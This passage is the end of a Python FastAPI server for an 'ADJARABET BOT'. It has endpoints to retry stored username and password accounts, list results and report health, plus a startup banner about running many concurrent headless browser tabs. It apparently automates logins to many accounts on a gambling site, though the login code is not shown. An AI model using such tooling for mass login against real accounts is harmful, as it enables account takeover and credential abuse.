@app.post("/clear-results")
async def clear_results():
    await bot.clear_results()
    return {"status": "cleared"}

@app.post("/retry/{username}")
async def retry_account(username: str):
    all_data = await bot.get_results()
    account_data = None
    for acc in all_data:
        if acc["username"] == username:
            account_data = acc
            break
    if not account_data:
        return JSONResponse({"error": "Account not found"}, 404)
    acc = Account(account_data["username"], account_data["password"])
    asyncio.create_task(retry_single_account(acc))
    return {"status": "retry_started", "username": username}

@app.get("/results")
async def get_results():
    return await bot.get_results()

@app.get("/health")
async def health():
    return {
        "status": "healthy", 
        "current_index": bot.current_index, 
        "total": len(bot.all_accounts), 
        "total_processed": len(bot.results),
        "concurrent_limit": CONFIG["concurrent_limit"]
    }

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            try:
                await asyncio.wait_for(websocket.receive_text(), timeout=60)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_text("ping")
                except:
                    break
    except (WebSocketDisconnect, Exception):
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    Path("results").mkdir(exist_ok=True)
    print("\n" + "=" * 60)
    print("🎮 ADJARABET BOT v26.0 - CONCURRENT MODE")
    print("=" * 60)
    print(f"📍 Web UI: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"🔧 Headless: {CONFIG['headless']}")
    print(f"⚡ REAL Concurrent: {CONFIG['concurrent_limit']} tabs at the SAME TIME!")
    print(f"✅ Stop → Start resumes from EXACT position")
    print(f"✅ Each account gets INDEPENDENT browser tab")
    print(f"🔄 Reset All - fresh start")
    print(f"🗑 Clear Results - clear table only")
    print("=" * 60 + "\n")
    uvicorn.run(app, host=CONFIG["host"], port=CONFIG["port"], log_level="warning", access_log=False)
